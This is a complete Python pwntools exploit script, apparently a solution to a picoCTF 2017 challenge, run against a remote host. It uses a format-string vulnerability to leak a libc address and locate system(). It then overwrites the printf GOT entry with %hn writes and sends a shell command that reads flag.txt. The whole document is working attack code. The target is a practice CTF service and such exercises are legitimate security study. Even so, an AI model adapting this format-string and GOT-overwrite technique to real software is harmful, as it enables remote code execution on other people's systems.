#!/usr/bin/env python2
from pwn import *
BYTES_WRITTEN_BEFORE_PAYLOAD = 129
LIBC_START_MAIN_RET_OFFSET = 0x19a63
SYSTEM_OFFSET = 0x3e3e0
STRCHR_GOT_PLT = 0x08049980
PRINTF_GOT_PLT = 0x08049970
def get_libc_addr(r):
	r.send("%11$20plibc\n")
	data = r.recvuntil("libc")[-24:-4]
	libc_addr = int(data,16)-LIBC_START_MAIN_RET_OFFSET
	return libc_addr
def get_addr_from_stack(r,index):
	r.send("%{}$20pstck\n".format(index))
	data = r.recvuntil("stck")[-24:-4]
	addr = int(data,16)
	return addr
def get_system_addr(libc_addr):
	return libc_addr+SYSTEM_OFFSET
def write_on_stack(r,index,msg):
	to_write = msg - BYTES_WRITTEN_BEFORE_PAYLOAD
	payload = ""
	payload += "%"+str(to_write)+"x"
	payload += "%{}$hn".format(index)
	r.send(payload+"\n")

r = remote("shell2017.picoctf.com",46133)
libc_addr = get_libc_addr(r)
system_addr = get_system_addr(libc_addr)
PRINTF1 = PRINTF_GOT_PLT&0xffff
PRINTF2 = (PRINTF_GOT_PLT>>16)&0xffff
addr_from_stack = get_addr_from_stack(r,9)
write_on_stack(r,9,PRINTF1)
write_on_stack(r,17,(addr_from_stack+2)&0xffff)
write_on_stack(r,53,PRINTF2)
write_on_stack(r,16,system_addr&0xffff)
r.send(";cat flag.txt;echo ':flag';\n")
try:
	print("The flag is: %s"%r.recvuntil(":flag").splitlines()[-2])
except EOFError:
	print("Failed")
